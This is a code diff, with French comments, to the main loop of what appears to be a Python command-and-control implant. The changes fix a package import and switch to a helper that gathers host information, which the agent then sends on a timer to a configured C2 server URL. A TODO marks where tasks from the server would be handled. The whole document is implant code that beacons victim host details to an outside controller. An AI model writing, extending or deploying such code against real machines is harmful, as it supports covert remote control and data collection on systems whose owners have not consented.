@@ -15,8 +15,12 @@ import os
 current_dir = os.path.dirname(os.path.abspath(__file__))
 if current_dir not in sys.path:
     sys.path.insert(0, current_dir)
+# Il est préférable d'ajouter la racine du projet pour que le package 'agent' soit trouvable
+project_root = os.path.abspath(os.path.join(current_dir, os.pardir))
+if project_root not in sys.path:
+    sys.path.insert(0, project_root)
 
-from comms import http_beacon # Import relatif depuis le même dossier 'agent'
+from agent.comms import http_beacon # MODIFIÉ: S'assurer que c'est un import de package
 
 # Configuration de l'agent (pourrait être dans un fichier de config ou des constantes partagées)
 AGENT_VERSION = "0.1.0-dev"
@@ -30,13 +34,17 @@ def main_loop(c2_url: str, beacon_interval: int):
     print(f"Serveur C2 configuré: {c2_url}")
     print(f"Intervalle de beacon: {beacon_interval} secondes\n")
 
-    basic_agent_info = http_beacon.get_host_info()
-    # On peut ajouter/mettre à jour des infos spécifiques ici si besoin
-    basic_agent_info["agent_version"] = AGENT_VERSION
+    # basic_agent_info = http_beacon.get_host_info() # ANCIEN
+    # # On peut ajouter/mettre à jour des infos spécifiques ici si besoin
+    # basic_agent_info["agent_version"] = AGENT_VERSION # ANCIEN
+
+    # NOUVEAU: get_base_agent_info prend maintenant la version de l'agent en argument
+    agent_full_info = http_beacon.get_base_agent_info(agent_version=AGENT_VERSION)
 
     while True:
         print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Envoi du check-in...")
-        response = http_beacon.send_checkin(c2_url, agent_id, basic_agent_info)
+        # response = http_beacon.send_checkin(c2_url, agent_id, basic_agent_info) # ANCIEN
+        response = http_beacon.send_checkin(c2_url, agent_id, agent_full_info) # NOUVEAU
         
         if response:
             # TODO: Traiter la réponse du serveur C2 (ex: nouvelles tâches à exécuter)
